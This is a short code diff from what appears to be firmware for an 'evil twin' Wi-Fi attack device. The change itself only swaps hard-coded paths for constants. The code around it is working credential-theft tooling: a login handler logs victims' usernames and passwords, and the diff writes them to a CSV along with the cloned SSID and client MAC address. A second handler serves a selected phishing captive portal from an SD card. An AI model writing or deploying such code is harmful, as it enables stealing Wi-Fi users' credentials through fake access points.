@@ -173,14 +173,14 @@ void EvilTwin::handleLogin(AsyncWebServerRequest* request) {
         LOG(LogLevel::INFO, "EVILTWIN", "User: %s", victim.username.c_str());
         LOG(LogLevel::INFO, "EVILTWIN", "Pass: %s", victim.password.c_str());
         
-        // --- SAVE TO CSV WITH HEADER LOGIC ---
-        String log_path = "/logs/credentials.csv";
+        // --- SAVE TO CSV ---
+        const char* log_path = SD_ROOT::CAPTURES_EVILTWIN_CSV;
 
         // Step 1: Check if the file exists. If not, create it with a header.
-        if (!SdCardManager::exists(log_path.c_str())) {
+        if (!SdCardManager::exists(log_path)) {
             // Serial.println("[EVILTWIN] Log file not found. Creating with header.");
             LOG(LogLevel::INFO, "EVILTWIN", "Log file not found. Creating with header.");
-            File logFile = SdCardManager::openFile(log_path.c_str(), FILE_WRITE);
+            File logFile = SdCardManager::openFile(log_path, FILE_WRITE);
             if (logFile) {
                 logFile.println("timestamp,portal_used,ssid_cloned,client_mac,username,password");
                 logFile.close();
@@ -191,7 +191,7 @@ void EvilTwin::handleLogin(AsyncWebServerRequest* request) {
         }
         
         // Step 2: Open the file in APPEND mode to add the new credentials.
-        File logFile = SdCardManager::openFile(log_path.c_str(), FILE_APPEND);
+        File logFile = SdCardManager::openFile(log_path, FILE_APPEND);
         if (logFile) {
             logFile.printf("%lu,%s,%s,%s,%s,%s\n",
                            millis(),
@@ -220,7 +220,7 @@ void EvilTwin::handleCaptivePortal(AsyncWebServerRequest* request) {
         request->send(500, "text/plain", "Server Error: No portal selected.");
         return;
     }
-    String portal_path = "/portals/" + String(selectedPortal_.c_str()) + "/index.html";
+    String portal_path = String(SD_ROOT::USER_PORTALS) + "/" + String(selectedPortal_.c_str()) + "/index.html";
     if (SdCardManager::exists(portal_path.c_str())) {
         request->send(SD, portal_path.c_str(), "text/html");
     } else {
